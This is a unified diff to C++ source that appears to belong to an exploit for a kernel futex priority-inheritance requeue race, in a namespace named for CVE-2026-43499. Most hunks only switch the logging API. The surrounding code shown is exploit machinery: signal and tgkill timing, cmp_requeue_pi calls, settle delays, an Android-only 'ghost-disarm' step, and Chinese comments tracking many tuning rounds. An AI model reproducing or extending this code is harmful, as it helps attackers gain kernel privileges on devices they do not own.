@@ -28,7 +28,7 @@
  */
 #include <atomic>
 
-#include "support/log.hpp"   /* ★ 第 271 轮 ✓（用户裁定）：异步日志接缝 ✓ —— 出 PI 由它打印 ✓ */
+#include "support/gl_log.h"   /* ★ 第 271 轮 ✓（用户裁定）：异步日志接缝 ✓ —— 出 PI 由它打印 ✓ */
 #include <concepts>
 #include <cstddef>
 #include <cstdint>
@@ -393,7 +393,7 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         static void on_signal(int) noexcept {}
 
         void requeue() noexcept {
-            ghostlock::support::log("debug", "requeue ->");   /* ★ 步骤前 ✓ 语句边界 ✓ */
+            debug("requeue ->");   /* ★ 步骤前 ✓ 语句边界 ✓ */
             std::signal(SIGUSR1, &MulticastRoute::on_signal);   /* 幂等 ✓；必须先于任何 tgkill ✓ */
             /* ★★ 第 258 轮 ✓（按 ref 指示：`ghostlock-app-ref/.../race/threads.cpp:176` 逐字 ——
              *  门控循环里是 **`usleep(race_state_poll_interval_us())`** ✓ 而本树用 `Ops::yield()` ✗ ⇒
@@ -413,7 +413,7 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                 }
             }
             if (config_.settle_us > 0) {
-                ghostlock::support::log("debug", "requeue branch: settle grace before requeue");
+                debug("requeue branch: settle grace before requeue");
                 Ops::sleep_micros(config_.settle_us);
             }
             /* 与退役同字：requeue 从**等待者持有的那个字**（chain_word ✓）搬走（退役 cmp_requeue_pi(chain, target)）。 */
@@ -459,8 +459,7 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             shared_.requeue_result = Ops::cmp_requeue_pi(&shared_.wait_word, &shared_.target_word);
             /* ★★ 第 197 轮**回退** ✗：第 190 轮在此发 `SIGUSR1` ⇒ 真机在"建线程/设 CPU"后**停住** ✗
              *  （⇒ 纯 C 的 `tgkill` 是**同进程内**的 `mr_y_tid` ✓；本树条件不同 ⇒ 先撤 ✓）。 */
-            ghostlock::support::log("debug", "requeue <- ret",
-                                                static_cast<std::int64_t>(shared_.requeue_result));
+            debug("requeue <- ret %lld", static_cast<long long>(shared_.requeue_result));
             std::printf("main: requeue ret=%d errno=%d (EDEADLK=35 ✅ 旧码的成功形态 ✓)",
                         static_cast<int>(shared_.requeue_result), static_cast<int>(errno));
             /* 相位一（退役 waiter.post_requeue_settle_us）：内核搬完链再让 consumer 动。 */
@@ -492,19 +491,21 @@ namespace ghostlock::backend::cve_2026_43499::landing {
          *  @param level The level name for every line (the logger's level comes from the profile).
          *  @note Must run outside PI: the caller reaches it after stop_threads() has joined all
          *        actors, so nothing is being walked while these lines are written. */
-        void report_pi_readings(std::string_view level) noexcept {
-            ghostlock::support::log(level, "waiter-lock", shared_.lock_result, shared_.lock_errno);
-            ghostlock::support::log(level, "park-about word",
-                                    static_cast<std::int64_t>(shared_.park_wait_word));
-            ghostlock::support::log(level, "park-about target-word address",
-                                    ghostlock::support::Hex{
-                                            static_cast<std::uint64_t>(shared_.park_target_word)});
-            ghostlock::support::log(level, "park-return", shared_.waiter_result, shared_.park_errno);
+        void report_pi_readings(const char *level) noexcept {
+            const gl_log_level at = gl_log_level_from_name(level);
+            gl_log_write(at, __FILE__, __LINE__, "waiter-lock %d %d", (int) shared_.lock_result,
+                         (int) shared_.lock_errno);
+            gl_log_write(at, __FILE__, __LINE__, "park-about word %u",
+                         (unsigned) shared_.park_wait_word);
+            gl_log_write(at, __FILE__, __LINE__, "park-about target-word address 0x%x",
+                         (unsigned) shared_.park_target_word);
+            gl_log_write(at, __FILE__, __LINE__, "park-return %d %d", (int) shared_.waiter_result,
+                         (int) shared_.park_errno);
 #if defined(__ANDROID__)
-            /* 摘除只在设备侧跑（与写入点同一条件 ✓）⇒ 非设备构建不印这条幻影行 ✓。 */
+            /* 摘除只在设备侧跑（与写入点同一条件 ⇒ 非设备构建不印这条幻影行）。 */
             if (config_.needs_ghost_disarm) {
-                ghostlock::support::log(level, "ghost-disarm", shared_.disarm_result,
-                                        shared_.disarm_errno);
+                gl_log_write(at, __FILE__, __LINE__, "ghost-disarm %d %d",
+                             (int) shared_.disarm_result, (int) shared_.disarm_errno);
             }
 #endif
         }
@@ -538,9 +539,8 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             /* ★ C 段 ✓（两个**结果分支**各出一条 ✓）：judge 的**唯一调用点在 stop_threads() 之后**
              *  ⇒ 本函数整个在 PI 之外（2026-10-12 用户裁定）⇒ 直接打印，不进环、也不受守卫扫描 ✓
              *  （守卫台账里 judge 是**具名豁免** ✓，见 tools/window_body_guard.py）。 */
-            ghostlock::support::log("info", "judge-outcome",
-                                    static_cast<std::int64_t>(status.code),
-                                    static_cast<std::int64_t>(status.step));
+            debug("judge-outcome %lld %lld", static_cast<long long>(status.code),
+                    static_cast<long long>(status.step));
             report_.status = status;
             return status.code == route::RouteResultCode::Ok;
         }
